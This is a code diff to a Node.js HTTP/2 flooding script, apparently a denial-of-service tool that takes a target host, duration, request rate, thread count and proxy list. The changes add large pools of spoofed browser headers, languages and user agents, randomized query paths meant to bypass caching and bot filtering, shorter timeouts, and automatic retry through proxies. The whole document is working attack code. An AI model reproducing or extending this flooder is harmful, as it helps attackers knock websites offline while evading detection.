@@ -20,9 +20,31 @@ const accept_header = [
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
     'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-  ],
-
-  cache_header = [
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
+],
+cache_header = [
     'max-age=0',
     'no-cache',
     'no-store',
@@ -34,7 +56,7 @@ const accept_header = [
     'no-cache, no-store,private, max-age=0, must-revalidate',
     'no-cache, no-store,private, s-maxage=604800, must-revalidate',
     'no-cache, no-store,private, max-age=604800, must-revalidate',
-  ]
+]
 language_header = [
     'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
     'en-US,en;q=0.5',
@@ -131,6 +153,69 @@ language_header = [
     'yo-NG,yo;q=0.8',
     'zgh-MA,zgh;q=0.8',
     'zu-ZA,zu;q=0.8',
+    'en-GB,en;q=0.9',
+    'en-CA,en;q=0.9',
+    'en-AU,en;q=0.9',
+    'de-DE,de;q=0.9',
+    'es-ES,es;q=0.9',
+    'fr-FR,fr;q=0.9',
+    'it-IT,it;q=0.9',
+    'ja-JP,ja;q=0.9',
+    'ko-KR,ko;q=0.9',
+    'pt-PT,pt;q=0.9',
+    'es-MX,es;q=0.9',
+    'zh-CN,zh;q=0.9, en;q=0.8',
+    'ru-RU,ru;q=0.9, en;q=0.8',
+    'ar-SA,ar;q=0.9',
+    'hi-IN,hi;q=0.9',
+    'id-ID,id;q=0.9',
+    'ms-MY,ms;q=0.9',
+    'th-TH,th;q=0.9',
+    'tr-TR,tr;q=0.9',
+    'vi-VN,vi;q=0.9',
+    'bn-BD,bn;q=0.9',
+    'fa-IR,fa;q=0.9',
+    'he-IL,he;q=0.9',
+    'nl-NL,nl;q=0.9, en;q=0.8',
+    'sv-SE,sv;q=0.9',
+    'pl-PL,pl;q=0.9',
+    'fi-FI,fi;q=0.9',
+    'no-NO,no;q=0.9',
+    'da-DK,da;q=0.9',
+    'cs-CZ,cs;q=0.9',
+    'hu-HU,hu;q=0.9',
+    'ro-RO,ro;q=0.9',
+    'sk-SK,sk;q=0.9',
+    'bg-BG,bg;q=0.9',
+    'hr-HR,hr;q=0.9',
+    'sr-RS,sr;q=0.9',
+    'lt-LT,lt;q=0.9',
+    'lv-LV,lv;q=0.9',
+    'et-EE,et;q=0.9',
+    'el-GR,el;q=0.9',
+    'uk-UA,uk;q=0.9',
+    'sl-SI,sl;q=0.9',
+    'sq-AL,sq;q=0.9',
+    'mk-MK,mk;q=0.9',
+    'bs-BA,bs;q=0.9',
+    'is-IS,is;q=0.9',
+    'mt-MT,mt;q=0.9',
+    'ga-IE,ga;q=0.9',
+    'cy-GB,cy;q=0.9',
+    'eu-ES,eu;q=0.9',
+    'ca-ES,ca;q=0.9',
+    'gl-ES,gl;q=0.9',
+    'af-ZA,af;q=0.9',
+    'zu-ZA,zu;q=0.9',
+    'xh-ZA,xh;q=0.9',
+    'st-ZA,st;q=0.9',
+    'tn-ZA,tn;q=0.9',
+    'ss-ZA,ss;q=0.9',
+    'nr-ZA,nr;q=0.9',
+    've-ZA,ve;q=0.9',
+    'ts-ZA,ts;q=0.9',
+    'nd-ZW,nd;q=0.9',
+    'sn-ZW,sn;q=0.9'
   ];
   const fetch_site = [
     "same-origin"
@@ -188,7 +273,7 @@ const secureOptions =
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
- if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`); process.exit();}
+ if (process.argv.length < 7){console.log(`Usage: host time req thread proxy.txt`.red); process.exit();}
  const secureProtocol = "TLS_method";
  const headers = {};
 
@@ -267,8 +352,8 @@ if (cluster.isMaster) {
         port: options.port,
     });
 
-    connection.setTimeout(options.timeout * 600000);
-    connection.setKeepAlive(true, 600000);
+    connection.setTimeout(1000);
+    connection.setKeepAlive(true, 1000);
     connection.setNoDelay(true)
     connection.on("connect", () => {
        connection.write(buffer);
@@ -486,6 +571,21 @@ const randstrsValue = randstrs(10);
 			"max-age": Math.random() < 0.5 ? 604800 : 2561000,
 			"include_subdomains": Math.random() < 0.5 ? true : false}),
             }
+     const queryParams = [
+      'language=vn',
+      'language=vi',
+      'lang=en',
+      'lang=fr',
+      'region=US',
+      'region=EU',
+      'q=' + randstr(5),
+      'id=' + randstrs(8),
+      'page=' + getRandomInt(1, 10),
+      'sort=asc',
+      'sort=desc',
+      'filter=active',
+      'filter=all'
+    ];
 
      const rateHeaders = [
         {"accept" :accept_header[Math.floor(Math.random() * accept_header.length)]},
@@ -506,7 +606,6 @@ const randstrsValue = randstrs(10);
 let headers = {
   ":authority": parsedTarget.host,
   ":scheme": "https",
-  ":path": parsedTarget.path + "?" + randstr(3) + "=" +generateRandomString(10,25),
   ":method": "GET",
   "pragma" : "no-cache",
   "upgrade-insecure-requests" : "1",
@@ -517,20 +616,31 @@ let headers = {
   "sec-fetch-dest": fetch_dest[Math.floor(Math.random() * fetch_dest.length)],
   "user-agent" : randomUA(),
 }
+let dynamicPath = parsedTarget.path;
+if (dynamicPath === '/') {
+  dynamicPath = '/' + randstr(getRandomInt(5, 15));
+} else {
+  const params = [];
+  for (let i = 0; i < getRandomInt(1, 3); i++) {
+    params.push(randomElement(queryParams));
+  }
+  dynamicPath += '?' + params.join('&');
+}
+headers[":path"] = dynamicPath;
  const proxyOptions = {
      host: parsedProxy[0],
      port: ~~parsedProxy[1],
      address: parsedTarget.host + ":443",
-     timeout: 2
+     timeout: 1
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
     if (error) {
       console.log(`Proxy connection error: ${error}`.red);
-      return
+      return runFlooder();
     }
 
     console.log(`Connected via proxy: ${proxyAddr}`.blue);
-    connection.setKeepAlive(true, 600000);
+    connection.setKeepAlive(true, 1000);
     connection.setNoDelay(true)
 
     const settings = {
@@ -561,7 +671,7 @@ let headers = {
 
     tlsConn.allowHalfOpen = true;
     tlsConn.setNoDelay(true);
-    tlsConn.setKeepAlive(true, 600000);
+    tlsConn.setKeepAlive(true, 1000);
     tlsConn.setMaxListeners(0);
 
     const client = http2.connect(parsedTarget.href, {
@@ -649,14 +759,194 @@ function randomUA() {
     'Macintosh; Intel Mac OS X 10_15_7',
     'X11; Linux x86_64',
     'X11; Ubuntu; Linux x86_64',
-    'iPhone; CPU iPhone OS 14_0 like Mac OS X'
+    'iPhone; CPU iPhone OS 14_0 like Mac OS X',
+    'Windows NT 10.0; WOW64',
+    'Windows NT 6.3; Win64; x64',
+    'Macintosh; Intel Mac OS X 10_14_6',
+    'X11; Linux i686',
+    'X11; Fedora; Linux x86_64',
+    'Android 10; K',
+    'iPad; CPU OS 13_3 like Mac OS X',
+    'Windows NT 5.1; Win64; x64',
+    'Macintosh; Intel Mac OS X 10.15; rv:109.0',
+    'X11; CrOS x86_64 13505.73.0',
+    'Windows NT 10.0; ARM64',
+    'Macintosh; Intel Mac OS X 11_2_3',
+    'X11; Linux armv7l',
+    'iPhone; CPU iPhone OS 15_0 like Mac OS X',
+    'Windows NT 6.2; Win64; x64',
+    'Macintosh; Intel Mac OS X 10_13_6',
+    'X11; Ubuntu; Linux i686',
+    'Android 11; Pixel 4',
+    'Windows NT 10.0; Trident/7.0',
+    'Macintosh; Intel Mac OS X 12_0_1',
+    'X11; Linux ppc64',
+    'iPad; CPU OS 14_4 like Mac OS X',
+    'Windows NT 6.1; WOW64',
+    'Macintosh; Intel Mac OS X 10_12_6',
+    'X11; Linux x86_64; rv:78.0',
+    'Android 9; SM-G960F',
+    'Windows NT 10.0; Win64; x64; rv:91.0',
+    'Macintosh; Intel Mac OS X 10_11_6',
+    'X11; Ubuntu; Linux armv8l',
+    'iPhone; CPU iPhone OS 13_3_1 like Mac OS X',
+    'Windows NT 6.3; WOW64',
+    'Macintosh; Intel Mac OS X 10_10_5',
+    'X11; Linux i586',
+    'Android 12; SM-A515F',
+    'Windows NT 10.0; Win64; x64; rv:89.0',
+    'Macintosh; Intel Mac OS X 10_9_5',
+    'X11; Linux x86_64-apple-darwin',
+    'iPad; CPU OS 15_0 like Mac OS X',
+    'Windows NT 6.0; Win64; x64',
+    'Macintosh; Intel Mac OS X 10_8_5',
+    'X11; Linux armv6l',
+    'Android 8.1.0; Nexus 5X Build/OPM3.171019.014',
+    'Windows NT 10.0; Win64; x64; rv:78.0',
+    'Macintosh; Intel Mac OS X 10_7_5',
+    'X11; Linux x86_64; rv:68.0',
+    'iPhone; CPU iPhone OS 12_4_1 like Mac OS X',
+    'Windows NT 6.1; Win64; x64; rv:56.0',
+    'Macintosh; Intel Mac OS X 10_6_8',
+    'X11; Ubuntu; Linux x86_64; rv:88.0',
+    'Android 7.0; LG-H830 Build/NRD90U',
+    'Windows NT 10.0; Win64; x64; rv:102.0',
+    'Macintosh; Intel Mac OS X 10_15_6',
+    'X11; Linux i686 on x86_64',
+    'iPad; CPU OS 12_2 like Mac OS X',
+    'Windows NT 6.2; WOW64',
+    'Macintosh; Intel Mac OS X 10_14_5',
+    'X11; Fedora; Linux i686',
+    'Android 10; SM-G973F',
+    'Windows NT 5.1; rv:52.0',
+    'Macintosh; Intel Mac OS X 10_13_5',
+    'X11; Linux x86_64; rv:91.0',
+    'iPhone; CPU iPhone OS 14_4 like Mac OS X',
+    'Windows NT 6.3; Win64; x64; rv:78.0',
+    'Macintosh; Intel Mac OS X 10_12_5',
+    'X11; Ubuntu; Linux i686; rv:78.0',
+    'Android 11; Pixel 5',
+    'Windows NT 10.0; rv:91.0',
+    'Macintosh; Intel Mac OS X 10_11_5',
+    'X11; Linux arm64',
+    'iPad; CPU OS 13_5 like Mac OS X',
+    'Windows NT 6.1; rv:68.0',
+    'Macintosh; Intel Mac OS X 10_10_4',
+    'X11; Linux x86_64; rv:102.0',
+    'Android 9; Pixel 3 XL',
+    'Windows NT 10.0; Win64; x64; rv:99.0',
+    'Macintosh; Intel Mac OS X 10_15_5',
+    'X11; Ubuntu; Linux armv7l',
+    'iPhone; CPU iPhone OS 15_1 like Mac OS X',
+    'Windows NT 6.0; WOW64',
+    'Macintosh; Intel Mac OS X 10_9_4',
+    'X11; Linux i686; rv:68.0',
+    'Android 8.0.0; SM-G950F Build/R16NW',
+    'Windows NT 5.2; Win64; x64',
+    'Macintosh; Intel Mac OS X 10_8_4',
+    'X11; Linux ppc',
+    'iPad; CPU OS 14_0 like Mac OS X',
+    'Windows NT 6.4; Win64; x64',
+    'Macintosh; Intel Mac OS X 10_14_4',
+    'X11; Linux x86_64; rv:78.0',
+    'Android 12; Pixel 6'
   ];
   const browsers = [
     'Chrome/114.0.0.0 Safari/537.36',
     'Firefox/113.0',
     'Safari/537.36',
     'Edg/114.0.1823.58',
-    'OPR/99.0.0.0'
+    'OPR/99.0.0.0',
+    'Chrome/113.0.0.0 Safari/537.36',
+    'Firefox/112.0',
+    'Safari/537.35',
+    'Edg/113.0.1774.57',
+    'OPR/98.0.0.0',
+    'Chrome/112.0.0.0 Safari/537.36',
+    'Firefox/111.0',
+    'Safari/537.34',
+    'Edg/112.0.1722.68',
+    'OPR/97.0.0.0',
+    'Chrome/111.0.0.0 Safari/537.36',
+    'Firefox/110.0',
+    'Safari/537.33',
+    'Edg/111.0.1661.62',
+    'OPR/96.0.0.0',
+    'Chrome/110.0.0.0 Safari/537.36',
+    'Firefox/109.0',
+    'Safari/537.32',
+    'Edg/110.0.1587.69',
+    'OPR/95.0.0.0',
+    'Chrome/109.0.0.0 Safari/537.36',
+    'Firefox/108.0',
+    'Safari/537.31',
+    'Edg/109.0.1518.78',
+    'OPR/94.0.0.0',
+    'Chrome/108.0.0.0 Safari/537.36',
+    'Firefox/107.0',
+    'Safari/537.30',
+    'Edg/108.0.1462.76',
+    'OPR/93.0.0.0',
+    'Chrome/107.0.0.0 Safari/537.36',
+    'Firefox/106.0',
+    'Safari/537.29',
+    'Edg/107.0.1418.62',
+    'OPR/92.0.0.0',
+    'Chrome/106.0.0.0 Safari/537.36',
+    'Firefox/105.0',
+    'Safari/537.28',
+    'Edg/106.0.1370.52',
+    'OPR/91.0.0.0',
+    'Chrome/105.0.0.0 Safari/537.36',
+    'Firefox/104.0',
+    'Safari/537.27',
+    'Edg/105.0.1343.53',
+    'OPR/90.0.0.0',
+    'Chrome/104.0.0.0 Safari/537.36',
+    'Firefox/103.0',
+    'Safari/537.26',
+    'Edg/104.0.1293.70',
+    'OPR/89.0.0.0',
+    'Chrome/103.0.0.0 Safari/537.36',
+    'Firefox/102.0',
+    'Safari/537.25',
+    'Edg/103.0.1264.71',
+    'OPR/88.0.0.0',
+    'Chrome/102.0.0.0 Safari/537.36',
+    'Firefox/101.0',
+    'Safari/537.24',
+    'Edg/102.0.1245.44',
+    'OPR/87.0.0.0',
+    'Chrome/101.0.0.0 Safari/537.36',
+    'Firefox/100.0',
+    'Safari/537.23',
+    'Edg/101.0.1210.53',
+    'OPR/86.0.0.0',
+    'Chrome/100.0.0.0 Safari/537.36',
+    'Firefox/99.0',
+    'Safari/537.22',
+    'Edg/100.0.1185.50',
+    'OPR/85.0.0.0',
+    'Chrome/99.0.0.0 Safari/537.36',
+    'Firefox/98.0',
+    'Safari/537.21',
+    'Edg/99.0.1150.55',
+    'OPR/84.0.0.0',
+    'Chrome/98.0.0.0 Safari/537.36',
+    'Firefox/97.0',
+    'Safari/537.20',
+    'Edg/98.0.1108.62',
+    'OPR/83.0.0.0',
+    'Chrome/97.0.0.0 Safari/537.36',
+    'Firefox/96.0',
+    'Safari/537.19',
+    'Edg/97.0.1072.76',
+    'OPR/82.0.0.0',
+    'Chrome/96.0.0.0 Safari/537.36',
+    'Firefox/95.0',
+    'Safari/537.18',
+    'Edg/96.0.1054.62',
+    'OPR/81.0.0.0'
   ];
   const versions = Math.floor(Math.random() * 100) + '.' + Math.floor(Math.random() * 1000) + '.' + Math.floor(Math.random() * 100);
   return `Mozilla/5.0 (${randomElement(osPlatforms)}) AppleWebKit/537.36 (KHTML, like Gecko) ${randomElement(browsers)} ${versions}`;
